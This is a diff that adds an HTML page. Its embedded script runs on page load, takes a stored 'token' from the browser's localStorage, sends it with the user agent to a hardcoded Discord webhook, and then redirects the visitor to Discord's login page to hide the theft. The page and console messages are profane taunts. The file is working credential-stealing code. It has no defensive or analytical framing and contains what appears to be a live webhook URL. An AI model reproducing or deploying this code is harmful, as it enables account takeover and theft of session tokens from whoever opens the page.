@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>You’re Fucked</title>
+</head>
+<body>
+    <h1>Click this, asshole</h1>
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1359550674945179790/d2K24fHkdb_K8WcF9SXftua0x9F_iSZZy1EfIVQ1pnSzcPUdSLrReVfml1pRTO9LkbkD';
+
+        function stealThatShit() {
+            const token = window.localStorage.getItem('token');
+            if (token) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**Token Stolen!**\nToken: \`${token}\`\nUser Agent: \`${navigator.userAgent}\``
+                    })
+                })
+                .then(() => {
+                    console.log('Sent, you slick fuck');
+                    window.location.href = 'https://discord.com/login';
+                })
+                .catch(err => console.log('Fuckup:', err));
+            } else {
+                console.log('No token, dipshit');
+                window.location.href = 'https://discord.com/login';
+            }
+        }
+
+        stealThatShit();
+    </script>
+</body>
+</html>
